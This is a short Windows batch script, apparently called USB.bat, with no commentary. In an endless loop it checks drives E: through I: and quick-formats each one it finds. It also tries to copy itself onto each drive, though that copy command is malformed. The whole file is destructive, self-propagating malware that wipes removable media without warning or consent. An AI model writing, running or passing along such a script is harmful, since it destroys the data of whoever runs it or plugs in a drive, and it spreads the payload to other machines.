@echo off
:fck

if exist e:\ format /q /x E: copy "%CD%\USB.bat" e:\

if exist f:\ format /q /x F: copy "%CD%\USB.bat" f:\

if exist g:\ format /q /x G: copy "%CD%\USB.bat" g:\

if exist h:\ format /q /x H: copy "%CD%\USB.bat" h:\

if exist i:\ format /q /x I: copy "%CD%\USB.bat" i:\


goto fck